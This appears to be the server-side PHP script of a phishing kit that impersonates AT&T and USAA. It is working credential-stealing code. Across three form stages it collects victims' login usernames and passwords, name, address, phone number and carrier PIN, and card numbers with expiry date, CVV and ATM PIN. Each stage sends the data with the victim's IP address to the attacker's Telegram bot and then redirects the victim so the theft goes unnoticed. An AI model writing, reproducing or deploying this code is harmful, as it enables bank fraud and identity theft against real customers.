<?php
include_once("config.php");

function get_ip() {   
    if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
    }  
    else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
    }  
    else {  
        $ip = $_SERVER['REMOTE_ADDR'];  
    }  
    return $ip;  
} 

$ip = get_ip();

if (isset($_GET['Login'])) {

    $username = $_POST['userID'];
    $password = $_POST['pass'];


    if (!empty($bot_token) && !empty($chat_id)) {




        
        $msg = "";
        $msg.="[--+🏦  ATT  BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Logins info is here.\r\n\r\n";
        $msg.="  USERNAME : <code>$username</code>\r\n";
        $msg.="  PASSWORD :  <code>$password</code>\r\n\r\n";
        
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location: ../info.html?sessionid=fp27y26d1197da19");
};

	if (isset($_GET['Info'])) {

    $fname = $_POST['fname'];
    $address = $_POST['addy'];
	$city = $_POST['city'];
	$state = $_POST['state'];
    $zip = $_POST['zip'];
    $phone = $_POST['ph'];
    $carrier = $_POST['cp'];



    if (!empty($bot_token) && !empty($chat_id)) {




        
        $msg = "";
        $msg.="[--+🏦  ATT BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Perosnal Info is here.\r\n\r\n";
        $msg.=" Full Name : <code>$fname</code>\r\n";
        $msg.=" Address : <code>$address</code>\r\n";
		$msg.=" City: <code>$city</code>\r\n";
        $msg.=" State: <code>$state</code>\r\n";
        $msg.=" Zip Code : <code>$zip</code>\r\n";
        $msg.=" Phone Number : <code>$phone</code>\r\n";
        $msg.=" Carrier PIN : <code>$carrier</code>\r\n";
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location: ../card.html?sessionid=ada7d36d9217da19");
};
	if (isset($_GET['Crd'])) {

    $cardnum = $_POST['cardnumber'];
    $exp = $_POST['expdate'];
	$cvv = $_POST['cvv'];
	$atm = $_POST['atm'];

    if (!empty($bot_token) && !empty($chat_id)) {




        
        $msg = "";
        $msg.="[--+🏦  USAA BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Card Info is here.\r\n\r\n";
        $msg.=" Card Number : <code>$cardnum</code>\r\n";
        $msg.=" Expiry Date :  <code>$exp</code>\r\n";
		$msg.=" CVV : <code>$cvv</code>\r\n";
		$msg.=" Carrier PIN : <code>$atm</code>\r\n";
        
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location: https://att.com");
};

	?>